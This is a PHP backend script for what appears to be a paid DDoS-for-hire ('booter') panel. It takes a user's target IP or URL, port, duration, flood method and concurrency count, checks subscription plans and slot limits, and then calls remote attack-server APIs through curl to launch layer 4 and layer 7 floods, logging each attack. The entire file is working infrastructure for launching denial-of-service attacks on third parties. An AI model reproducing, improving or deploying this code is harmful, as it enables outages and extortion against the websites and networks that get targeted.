<?php
	if (!isset($_SERVER['HTTP_REFERER'])) {
		header('HTTP/1.0 404 Not Found');
		exit();
	}

	require '../../../../backend/configuration/database.php';
	require '../../../../backend/configuration/funcsinit.php';


	if (!$user->UserLoggedIn() || !$user->notBanned($odb)) {
		header('HTTP/1.0 404 Not Found');
		exit();
	}
	//if (!($user->activeMembership($odb))) {
	//	header('HTTP/1.0 404 Not Found');
	//	exit();
	//}

	$type = htmlentities($user -> CheckInput($_GET['type']));
	if($user -> SecureText($type)){
		header('HTTP/1.0 400 Bad Request');
		exit();
	}	
	if($type == 'l4'){

		$host = $_POST['host'];
		$time = intval($_POST['time']);
		$port = intval($_POST['port']);
		$method = htmlentities($user -> CheckInput($_POST['method']));
		$concs = intval($_POST['concs']);

		if($user -> SecureText($method)){
			header('HTTP/1.0 400 Bad Request');
			exit();
		}

		if(!(is_numeric($_POST['time'])) || !(is_numeric($_POST['port'])) || !(is_numeric($_POST['concs']))){
			header('HTTP/1.0 400 Bad Request');
			exit();
		}


		if (!($user->activeMembership($odb))) {
			$errors[] = "Please fill all required fields to create account!";
        	echo json_encode(array('status'=>'error', 'message'=>'You do not have active membership.'));
        	die();
			return;

		}

		$SQLMethod = $odb -> prepare("SELECT COUNT(*) FROM `methods` WHERE `apiname` = :method AND `premium` = '1'");
		$SQLMethod -> execute(array(":method" => $method));
		$checkMethod = $SQLMethod ->fetchColumn(0);
		if(!($user->isUserPremium($odb)) && $checkMethod == '1') {
			$errors[] = "You do not have access to this method, please upgrade your plan!";
        	echo json_encode(array('status'=>'error', 'message'=>'You do not have access to this method, please upgrade your plan.'));
        	die();
			return;
		}
		
		$MethodDB = $odb -> prepare("SELECT * FROM `methods` WHERE `apiname` = :method");
		$MethodDB -> execute(array(':method' => $method));
		$methodinfo = $MethodDB -> fetch(PDO::FETCH_ASSOC);
		$premiummethod = $methodinfo['premium'];
		$timelimit = $methodinfo['timelimit'];

		$UserInfoDB = $odb -> prepare("SELECT * FROM `users` WHERE `id` = :id");
	    $UserInfoDB -> execute(array(':id' => $_SESSION['id']));
	    $user = $UserInfoDB -> fetch(PDO::FETCH_ASSOC);
	    $planid = $user['plan'];

		$Attacks = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `enddate` > UNIX_TIMESTAMP() AND `user` = :user AND `stopped` = 0");
		$Attacks -> execute(array(':user' => $_SESSION['username']));
		$runningattacks = $Attacks -> rowCount();

		$PlanInfo = $odb -> prepare("SELECT * FROM `plans` WHERE `id` = :planid");
		$PlanInfo -> execute(array(':planid' => $planid));

		$plan = $PlanInfo -> fetch(PDO::FETCH_ASSOC);

		$Addons = $odb -> prepare("SELECT `addon_concs`, `addon_time` FROM `users` WHERE `username` = :username");
		$Addons -> execute(array(':username' => $_SESSION['username']));

		$addon = $Addons -> fetch(PDO::FETCH_ASSOC);

		$totalconcs = ($plan['concs'] + $addon['addon_concs']);
		$totalattacktime = ($plan['time'] + $addon['addon_time']);

		if(empty($host) || empty($time) || empty($port) || empty($method) || empty($concs) || $port < 0 || $port > 65535){
			$errors[] = "Please fill all required fields";
        	echo json_encode(array('status'=>'error', 'message'=>'Please fill all required fields.'));
        	die();
		}
		if($time < 30){
			$errors[] = "The minimum value for time is 30 seconds";
        	echo json_encode(array('status'=>'error', 'message'=>'The minimum value for time is 30 seconds.'));
        	die();
		}
		if (!filter_var($host, FILTER_VALIDATE_IP)) {
			$errors[] = "Invalid IP Address format!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid IP Address format!'));
        	die();

		}
		if(!(filter_var($time, FILTER_SANITIZE_NUMBER_INT)) || !(filter_var($port, FILTER_SANITIZE_NUMBER_INT))){
			$errors[] = "Invalid port or time value!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid port or time value!'));
        	die();
		}
		if(!filter_var($concs, FILTER_SANITIZE_NUMBER_INT)){
			$errors[] = "Invalid concs value!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid concs value!'));
        	die();

		}

		$SheduledDB = $odb -> prepare("SELECT COUNT(*) FROM `sheduledattacks` WHERE `datetime` > UNIX_TIMESTAMP() AND `user` = :user");
		$SheduledDB -> execute(array(':user' => $_SESSION['username']));

		$countsheduled = $SheduledDB -> fetchColumn(0);

		if(($runningattacks + $countsheduled + $concs) > $totalconcs){
			$errors[] = "You can’t start as many attacks!";
        	echo json_encode(array('status'=>'error', 'message'=>'You can’t start as many attacks!'));
        	die();
		}

		if($concs > $totalconcs){
			$errors[] = "You reached max number of concurrents";
        	echo json_encode(array('status'=>'error', 'message'=>'You reached max number of your plan concurrents!'));
        	die();
		}
   

		if($time > $totalattacktime){
			$errors[] = "Maximum time";
        	echo json_encode(array('status'=>'error', 'message'=>'Your maximum boot time is '.$totalattacktime.' seconds!'));
        	die();
		}

		$SQLBlacklist = $odb->prepare("SELECT * FROM `blacklist` WHERE `target` LIKE :target");
		$SQLBlacklist -> execute(array(':target' => "%{$host}%"));
		
		$countBlacklist = $SQLBlacklist -> rowCount();

		if ($countBlacklist > 0 && $user['rank'] != "Admin") {
			$errors[] = "This target is blacklisted";
        	echo json_encode(array('status'=>'error', 'message'=>'This target is blacklisted!'));
        	die();

		}

		if($methodinfo['type'] != 'FREEL4' && $user['plan'] == '0'){
			$errors[] = "You do not have access to this method, please upgrade your plan.";
    		echo json_encode(array('status'=>'error', 'message'=>'You do not have access to this method, please purchase plan.'));
    		die();
		}else if($methodinfo['type'] == 'FREEL4' && $user['plan'] != '0'){
			$errors[] = "Only users with Free Plan can use this method!";
    		echo json_encode(array('status'=>'error', 'message'=>'Only users with Free Plan can use this method!'));
    		die();
		}else if($methodinfo['type'] == 'FREEL4' && $user['plan'] == '0' || $methodinfo['type'] != 'FREEL4' && $user['plan'] != '0' ){
			if($timelimit != 0 && $time > $timelimit){
				$errors[] = "Only users with Free Plan can use this method!";
    			echo json_encode(array('status'=>'error', 'message'=>'This method is limited on '.$timelimit.' seconds.'));
    			die();
			}else if($timelimit == 0 || $timelimit != 0 && $time <= $timelimit){
				if(empty($errors)){
					$atck = 0;
						
						$SQLSelectServer = $odb -> prepare("SELECT * FROM `servers` WHERE `id` > 0 AND `status` = 'online' AND `methods` LIKE :method ORDER BY RAND()");
						$SQLSelectServer -> execute(array(':method' => "%{$method}%"));

						while ($server = $SQLSelectServer -> fetch(PDO::FETCH_ASSOC)) {
							if ($atck > 0) {
			                	break;
			            	}
							$name = $server['name'];

							$LogsDB = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `servers` LIKE :name AND `enddate` > UNIX_TIMESTAMP() AND `stopped` = 0");
							$LogsDB -> execute(array(':name' => "%{$name}%"));

							$countslots = $LogsDB -> rowCount();

							if ($countslots >= $server['slots']) {
			                	continue;
			            	}else if($concs >= $server['slots']){
			            		continue;
			            	}else if(($countslots+$concs) > $server['slots']){
				            	continue;
				            }
			            	$atck++;


			            	$FindInApi = array('[host]', '[port]', '[time]', '[method]');
			            	$ApiReplace = array($host, $port, $time, $method);
			            	$API = $server['apiurl'];

			            	$handler[] = $server['name'];

			            	$APIReplaced = str_replace($FindInApi, $ApiReplace, $API);

			            	$handlers = @implode(",", $handler);

							$updateMethodStats = $odb -> prepare("UPDATE methods SET usageStats = usageStats + :concs WHERE apiname = :apiname");
							$updateMethodStats -> execute(array(':concs' => $concs, ':apiname' => $method));

			            	for ($x = 1; $x <= $concs; $x++) {
			            		$datee = date('Y-m-d H:i:s');
			            		$InsertLogs = $odb -> prepare("INSERT INTO `attacklogs`(`id`, `user`, `target`, `port`, `time`, `method`, `concs`, `stopped`, `servers`, `premium`, `apiattack`, `date`, `enddate`, `datetime`) VALUES (NULL, :user, :target, :port, :time, :method, :concs, '0', :handler, :premium, '0', UNIX_TIMESTAMP(NOW()), :enddate, :datetime)");

								$InsertLogs -> execute(array(':user' => $_SESSION['username'], ':target' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':concs' => $concs, ':handler' => $handlers, ':premium' => $premiummethod, ':enddate' => time() + $time, ':datetime' => $datee));

			            		$ch = curl_init();
			            		curl_setopt($ch, CURLOPT_URL, $APIReplaced);
						        curl_setopt($ch, CURLOPT_HEADER, 0);
						        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
						        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
						        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);    
						        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
						        $result = curl_exec($ch);
								curl_close($ch);

						        if(!$result){

						        	$errors[] = "There is problem with API, please contact administrator!";
									echo json_encode(array('status'=>'error', 'message'=>'There is problem with API, please contact administrator!'));
									die();
						        }

			            		
							}

						}
						if($atck == 0) {
			        		$errors[] = "No available slots!";
			    			echo json_encode(array('status'=>'error', 'message'=>'No available slots for your attack!'));
			    			die();	
			        	}
						echo json_encode(array('status'=>'success', 'message'=>'Attack successfully sent!'));
						die();
			     
			    }
			}
			
		}

		


	}else if($type == 'l7'){

		$host = $_POST['host'];
		$time = intval($_POST['time']);
		$port = 80;
		$method = htmlentities($user -> CheckInput($_POST['method']));
		$concs = intval($_POST['concs']);

		$reqmethod = $user -> CheckInput($_POST['reqmethod']);
		$reqs = intval($_POST['reqs']);

		if($user -> SecureText($method) || $user -> SecureText($reqmethod)){
			header('HTTP/1.0 400 Bad Request');
			exit();
		}

		if(!(is_numeric($_POST['time'])) || !(is_numeric($_POST['concs'])) || !(is_numeric($_POST['reqs']))){
			header('HTTP/1.0 400 Bad Request');
			exit();
		}

		if(!empty($reqs)){
			if(!is_numeric($reqs)){
				$errors[] = "Invalid requests!";
		    	echo json_encode(array('status'=>'error', 'message'=>'Invalid requests value, required number format.'));
		    	die();
			}
		}

		if (!($user->activeMembership($odb))) {
			$errors[] = "Please fill all required fields to create account!";
        	echo json_encode(array('status'=>'error', 'message'=>'You do not have active membership.'));
        	die();

		}

		$SQLMethod = $odb -> prepare("SELECT COUNT(*) FROM `methods` WHERE `apiname` = :method AND `premium` = '1'");
		$SQLMethod -> execute(array(":method" => $method));
		$checkMethod = $SQLMethod ->fetchColumn(0);
		if(!($user->isUserPremium($odb)) && $checkMethod == '1') {
			$errors[] = "You do not have access to this method, please upgrade your plan!";
        	echo json_encode(array('status'=>'error', 'message'=>'You do not have access to this method, please upgrade your plan.'));
        	die();
		}
		
		$MethodDB = $odb -> prepare("SELECT * FROM `methods` WHERE `apiname` = :method");
		$MethodDB -> execute(array(':method' => $method));
		$methodinfo = $MethodDB -> fetch(PDO::FETCH_ASSOC);
		$premiummethod = $methodinfo['premium'];
		$timelimit = $methodinfo['timelimit'];

		$UserInfoDB = $odb -> prepare("SELECT * FROM `users` WHERE `id` = :id");
	    $UserInfoDB -> execute(array(':id' => $_SESSION['id']));
	    $user = $UserInfoDB -> fetch(PDO::FETCH_ASSOC);
	    $planid = $user['plan'];

		$Attacks = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `enddate` > UNIX_TIMESTAMP() AND `user` = :user AND `stopped` = 0");
		$Attacks -> execute(array(':user' => $_SESSION['username']));
		$runningattacks = $Attacks -> rowCount();

		$PlanInfo = $odb -> prepare("SELECT * FROM `plans` WHERE `id` = :planid");
		$PlanInfo -> execute(array(':planid' => $planid));

		$plan = $PlanInfo -> fetch(PDO::FETCH_ASSOC);

		$Addons = $odb -> prepare("SELECT `addon_concs`, `addon_time` FROM `users` WHERE `username` = :username");
		$Addons -> execute(array(':username' => $_SESSION['username']));

		$addon = $Addons -> fetch(PDO::FETCH_ASSOC);

		$totalconcs = ($plan['concs'] + $addon['addon_concs']);
		$totalattacktime = ($plan['time'] + $addon['addon_time']);

		if(empty($host) || empty($time) || empty($method) || empty($concs) || $port != 80 || empty($reqs)){
			$errors[] = "Please fill all required fields";
        	echo json_encode(array('status'=>'error', 'message'=>'Please fill all required fields.'));
        	die();
		}
		if($reqs > 64){
			$errors[] = "Invalid requets per ip value!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid Requests per IP value!'));
        	die();
		}
		if($time < 30){
			$errors[] = "The minimum value for time is 30 seconds";
        	echo json_encode(array('status'=>'error', 'message'=>'The minimum value for time is 30 seconds.'));
        	die();
		}
		if (!filter_var($host, FILTER_VALIDATE_URL)) {
			$errors[] = "Invalid URL format!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid URL format!'));
        	die();

		}
		$requestmethods = array('GET', 'POST', 'HEAD');
		if(!in_array($reqmethod, $requestmethods)){
			$errors[] = "Invalid request method value!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid request method value!'));
        	die();
		}
		if(!(filter_var($time, FILTER_SANITIZE_NUMBER_INT)) || !(filter_var($concs, FILTER_SANITIZE_NUMBER_INT))){
			$errors[] = "Invalid port or time value!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid port or time value!'));
        	die();
		}
		$SheduledDB = $odb -> prepare("SELECT COUNT(*) FROM `sheduledattacks` WHERE `datetime` > UNIX_TIMESTAMP() AND `user` = :user");
		$SheduledDB -> execute(array(':user' => $_SESSION['username']));

		$countsheduled = $SheduledDB -> fetchColumn(0);

		if(($runningattacks + $countsheduled + $concs) > $totalconcs){
			$errors[] = "You can’t start as many attacks!";
        	echo json_encode(array('status'=>'error', 'message'=>'You can’t start as many attacks!'));
        	die();
		}

		if($concs > $totalconcs){
			$errors[] = "You reached max number of concurrents";
        	echo json_encode(array('status'=>'error', 'message'=>'You reached max number of your plan concurrents!'));
        	die();
		}

		if($time > $totalattacktime){
			$errors[] = "Maximum time";
        	echo json_encode(array('status'=>'error', 'message'=>'Your maximum boot time is '.$totalattacktime.' seconds!'));
        	die();
		}

		$SQLBlacklist = $odb->prepare("SELECT * FROM `blacklist` WHERE `target` LIKE :target");
		$SQLBlacklist -> execute(array(':target' => "%{$host}%"));
		
		$countBlacklist = $SQLBlacklist -> rowCount();

		if ($countBlacklist > 0) {
			$errors[] = "This target is blacklisted";
        	echo json_encode(array('status'=>'error', 'message'=>'This target is blacklisted!'));
        	die();

		}


		$BLUrl = $odb -> prepare("SELECT * FROM `blacklist` WHERE `type` = 'URL'");
		$BLUrl -> execute(); 

		$urlarrs = array();
		while($url = $BLUrl -> fetch(PDO::FETCH_ASSOC)){
			$urlarrs[] = $url['target'];
		}

		foreach ($urlarrs as $urlarr) {
			if(strpos($host, $urlarr)) {
				$errors[] = "This website is blacklisted";
				echo json_encode(array('status'=>'error', 'message'=>'This website is blacklisted.'));
				die();
		
			}
		}

		$BLDomain = $odb -> prepare("SELECT * FROM `blacklist` WHERE `type` = 'DOMAIN'");
		$BLDomain -> execute();

		$parameters = array();
		while($domain = $BLDomain -> fetch(PDO::FETCH_ASSOC)){
			$parameters[] = $domain['target'];
		}
			
		foreach ($parameters as $parameter) {
			if(strpos($host, $parameter)) {
				$errors[] = "This domain is blacklisted";
				echo json_encode(array('status'=>'error', 'message'=>'This domain is blacklisted.'));
				die();
		
			}
		}
		
		if($methodinfo['type'] != 'FREEL7' && $user['plan'] == '0'){
			$errors[] = "You do not have access to this method, please upgrade your plan.";
    		echo json_encode(array('status'=>'error', 'message'=>'You do not have access to this method, please purchase plan.'));
    		die();
		}else if($methodinfo['type'] == 'FREEL7' && $user['plan'] != '0'){
			$errors[] = "Only users with Free Plan can use this method!";
    		echo json_encode(array('status'=>'error', 'message'=>'Only users with Free Plan can use this method!'));
    		die();
		}else if($methodinfo['type'] == 'FREEL7' && $user['plan'] == '0' || $methodinfo['type'] != 'FREEL7' && $user['plan'] != '0' ){
			if($timelimit != 0 && $time > $timelimit){
				$errors[] = "Only users with Free Plan can use this method!";
    			echo json_encode(array('status'=>'error', 'message'=>'This method is limited on '.$timelimit.' seconds.'));
    			die();
			}else if($timelimit == 0 || $timelimit != 0 && $time <= $timelimit){
				if(empty($errors)){
					$atck = 0;
						
						$SQLSelectServer = $odb -> prepare("SELECT * FROM `servers` WHERE `id` > 0 AND `status` = 'online' AND `methods` LIKE :method ORDER BY RAND()");
						$SQLSelectServer -> execute(array(':method' => "%{$method}%"));

							
							while ($server = $SQLSelectServer -> fetch(PDO::FETCH_ASSOC)) {
							

								if ($atck > 0) {
				                	break;
				            	}
								$name = $server['name'];

								$LogsDB = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `servers` LIKE :name AND `enddate` > UNIX_TIMESTAMP() AND `stopped` = 0");
								$LogsDB -> execute(array(':name' => "%{$name}%"));

								$countslots = $LogsDB -> rowCount();

								if ($countslots >= $server['slots']) {
				                	continue;
				            	}else if($concs >= $server['slots']){
				            		continue;
				            	}else if(($countslots+$concs) > $server['slots']){
				            		continue;
				            	}
				            	$atck++;

				            	

				            	$FindInApi = array('[host]', '[port]', '[time]', '[method]', '[reqmethod]', '[reqs]', '[version]', '[referrer]', '[cookies]', '[geo]');
				            	$ApiReplace = array($host, $port, $time, $method, $reqmethod, $reqs, $httpversion, $referrer, $cookies, $geoloc);
				            	$API = $server['apiurl'];

				            	$handler[] = $server['name'];

				            	$APIReplaced = str_replace($FindInApi, $ApiReplace, $API);

				            	$handlers = @implode(",", $handler);

				            	
								$updateMethodStats = $odb -> prepare("UPDATE methods SET usageStats = usageStats + :concs WHERE apiname = :apiname");
								$updateMethodStats -> execute(array(':concs' => $concs, ':apiname' => $method));

				            	for ($x = 1; $x <= $concs; $x++) {
									$datee = date('Y-m-d H:i:s');

				            		$InsertLogs = $odb -> prepare("INSERT INTO `attacklogs`(`id`, `user`, `target`, `port`, `time`, `method`, `concs`, `stopped`, `servers`, `premium`, `apiattack`, `date`, `enddate`, `datetime`) VALUES (NULL, :user, :target, :port, :time, :method, :concs, '0', :handler, :premium, '0', UNIX_TIMESTAMP(NOW()), :enddate, :datetime)");
									$InsertLogs -> execute(array(':user' => $_SESSION['username'], ':target' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':concs' => $concs, ':handler' => $handlers, ':premium' => $premiummethod, ':enddate' => time() + $time, ':datetime' => $datee));
									// echo $methodupdated;
				            		$ch = curl_init();
				            		curl_setopt($ch, CURLOPT_URL, $APIReplaced);
							        curl_setopt($ch, CURLOPT_HEADER, 0);
							        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
							        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
							        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);    
							        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
							        $result = curl_exec($ch);
							        curl_close($ch);

							       	//echo $result;
							       	//echo $APIReplaced;
				            		
				            		if(!$result){
							        	$errors[] = "There is problem with API, please contact administrator!";
										echo json_encode(array('status'=>'error', 'message'=>'There is problem with API, please contact administrator!'));
										die();
							        }
				            		
								}

							}



						if($atck == 0) {
			        		$errors[] = "No available slots for your attack!";
			    			echo json_encode(array('status'=>'error', 'message'=>'No available slots for your attack!'));
			    			die();	
			        	}
						echo json_encode(array('status'=>'success', 'message'=>'Attack successfully sent!'));
						die();
			     
			    }
			}
			
		}



	}else if($type == 'stop'){

		echo json_encode(array('status'=>'error', 'message'=>'This option is temporarily unavailable'));
		die();


	}else if($type == 'stopall'){
		
		echo json_encode(array('status'=>'error', 'message'=>'This option is temporarily unavailable'));
		die();

	}
	











?>